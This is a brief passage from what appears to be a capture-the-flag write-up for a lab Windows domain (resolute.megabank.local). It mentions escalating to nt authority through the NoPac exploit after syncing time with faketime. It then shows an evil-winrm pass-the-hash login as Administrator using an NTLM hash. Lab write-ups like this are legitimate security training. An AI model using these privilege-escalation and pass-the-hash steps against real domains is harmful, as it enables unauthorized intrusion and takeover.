...
C:\Windows\system32>
```
Using faketime to sync with the domain controller i am able to get a shell as `nt authority` by exploiting NoPac
...
```python
evil-winrm -i resolute.megabank.local -u Administrator -H 'fb3b106896cdaa8a08072775fbd9afe9'
...
```
Domain admin for the third time !
